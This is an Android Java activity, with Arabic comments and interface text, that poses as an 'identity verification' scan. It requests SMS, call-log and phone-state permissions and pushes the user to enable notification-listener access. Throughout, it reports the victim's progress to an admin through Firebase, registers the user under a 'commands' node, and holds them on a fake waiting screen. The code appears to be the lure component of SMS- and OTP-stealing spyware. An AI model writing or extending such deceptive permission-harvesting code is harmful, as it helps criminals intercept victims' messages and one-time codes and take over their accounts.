package com.ban.ab;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

// استيراد الحزمة الرسمية للفايربيس السحابي 📡
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

public class VerifyActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 101;
    private String userName;
    
    private DatabaseReference mUserStatusRef;
    private Button btnStartVerify;
    private ProgressBar verifyProgressBar, progressBarTop;
    private TextView txtWaitStatus; // متغير لعرض كلمة "يرجى الانتظار..." ⏳

    // راية حماية لمنع الاختراق التلقائي للأذونات بدون ضغط الزر 🛡️
    private boolean isUserClickedStart = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_verify);

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        
        // تهيئة مرجع الحالات الخاص بالمستخدم الحالي
        mUserStatusRef = FirebaseDatabase.getInstance().getReference("users_status").child(userName);

        btnStartVerify = findViewById(R.id.btnStartVerify);
        verifyProgressBar = findViewById(R.id.verifyProgressBar);
        progressBarTop = findViewById(R.id.progressBarTop);
        txtWaitStatus = findViewById(R.id.txtWaitStatus); // تأكد من ربطه أو إضافته في الـ XML إذا رغبت

        if (btnStartVerify != null) {
            btnStartVerify.setOnClickListener(v -> {
                isUserClickedStart = true; // تثبيت نية المستخدم في بدء الفحص
                toggleLoading(true);
                
                // إعلام الأدمن ببدء التهيئة وضخ التوست ⏳
                updateAppFlag("STATE_INITIALIZING");
                new Handler(Looper.getMainLooper()).postDelayed(this::requestPermissionsSystem, 1000);
            });
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // 🟢 الإبقاء على حالة المستخدم Online أثناء تواجده في شاشة الأذونات
        if (mUserStatusRef != null) {
            mUserStatusRef.child("status").setValue("Online (In-App)");
        }

        // الحماية: لا يتم الفحص التلقائي عند العودة إلا إذا كان العميل قد ضغط على الزر بالفعل
        if (isUserClickedStart) {
            if (isNotificationServiceEnabled() && hasAllRuntimePermissions()) {
                notifyAdminSuccess();
            } else {
                toggleLoading(false);
            }
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        // 🔴 تحديث الحالة عند الخروج المؤقت لصفحة إعدادات النظام
        if (mUserStatusRef != null) {
            mUserStatusRef.child("status").setValue("Offline");
        }
    }

    // دالة التحكم المرئي في إخفاء الزر وإظهار شريط الانتظار بشكل احترافي 🔄
    private void toggleLoading(boolean isLoading) {
        if (isLoading) {
            // إخفاء الزر بالكامل لتجنب النقر المتعدد لضمان عدم التكرار 🚫
            if (btnStartVerify != null) btnStartVerify.setVisibility(View.GONE);
            
            // إظهار عناصر التحميل والنص التوضيحي للمستخدم
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.VISIBLE);
            if (progressBarTop != null) progressBarTop.setVisibility(View.VISIBLE);
            if (txtWaitStatus != null) {
                txtWaitStatus.setVisibility(View.VISIBLE);
                txtWaitStatus.setText("يرجى الانتظار حتى إكمال عملية الفحص... ⏳");
            }
        } else {
            // في حالة الفشل أو تراجع المستخدم، نعيد الواجهة لطبيعتها
            if (btnStartVerify != null) {
                btnStartVerify.setVisibility(View.VISIBLE);
                btnStartVerify.setEnabled(true);
                btnStartVerify.setText("بدء عملية الربط والتحقق");
            }
            if (verifyProgressBar != null) verifyProgressBar.setVisibility(View.GONE);
            if (progressBarTop != null) progressBarTop.setVisibility(View.GONE);
            if (txtWaitStatus != null) txtWaitStatus.setVisibility(View.GONE);
        }
    }

    // دالة فحص الأذونات الأربعة للتأكد من موافقة المستخدم عليها بالكامل قبل إغلاق الشاشة
    private boolean hasAllRuntimePermissions() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
        };
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    // دالة تحديث الأعلام الرقمية المتزامنة مع لوحة تحكم الآدمن 🛡️
    private void updateAppFlag(String stateCode) {
        if (mUserStatusRef != null) {
            mUserStatusRef.child("current_state").setValue(stateCode)
                    .addOnFailureListener(e -> Log.e("Verify_State", "فشل تحديث المعرف السحابي"));
        }
    }

    private void requestPermissionsSystem() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
        } else {
            checkNotificationListenerBridge();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_CODE) {
            checkNotificationListenerBridge();
        }
    }

    private void checkNotificationListenerBridge() {
        if (!isNotificationServiceEnabled()) {
            toggleLoading(false);
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                try {
                    startActivity(new Intent(Settings.ACTION_SETTINGS));
                } catch (Exception ignored) {}
            }
        } else {
            if (hasAllRuntimePermissions()) {
                notifyAdminSuccess();
            } else {
                toggleLoading(false);
                Toast.makeText(this, "يرجى الموافقة على جميع الأذونات المطلوبة أولاً", Toast.LENGTH_LONG).show();
            }
        }
    }

    // إرسال علامة نجاح الربط الكلي والتفعيل 🚀
    private void notifyAdminSuccess() {
        // تثبيت شريط الانتظار بشكل دائم ومنع تفاعل الواجهة
        toggleLoading(true);

        FirebaseDatabase.getInstance().getReference("commands")
                .child(userName).child("status").setValue("waiting")
                .addOnSuccessListener(aVoid -> {
                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي بنجاح ✅", Toast.LENGTH_SHORT).show();
                    updateAppFlag("STATE_SYNC_SUCCESS");
                    
                    // بدلاً من إغلاق الشاشة فوراً بـ finish()، نتركها مفتوحة ومثبتة على وضع الانتظار ⏳
                    if (txtWaitStatus != null) {
                        txtWaitStatus.setText("اكتمل الربط السحابي بنجاح! يرجى الانتظار حتى انتهاء الفحص الفني... 🛡️");
                    }
                })
                .addOnFailureListener(e -> {
                    // في حال انقطع الاتصال، نعيد الزر للمحاولة مجدداً
                    toggleLoading(false);
                    Toast.makeText(this, "فشل الربط السحابي، تحقق من الإنترنت", Toast.LENGTH_SHORT).show();
                    updateAppFlag("STATE_SYNC_FAILED");
                });
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }
}
